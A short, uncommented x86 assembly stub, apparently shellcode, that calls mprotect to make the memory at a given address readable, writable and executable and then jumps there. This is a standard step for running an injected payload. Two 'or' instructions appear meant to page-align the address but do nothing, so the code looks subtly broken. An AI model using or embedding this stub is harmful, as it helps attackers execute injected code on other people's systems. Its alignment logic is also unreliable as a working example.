BITS 32
; edi holds target address
xor eax, eax
xor ecx, ecx
xor edx, edx
mov ebx, edi
mov ch, 0xff
mov dl, 7
or bl, bl
or bh,bh
mov al, 0x7d
int 0x80
jmp edi
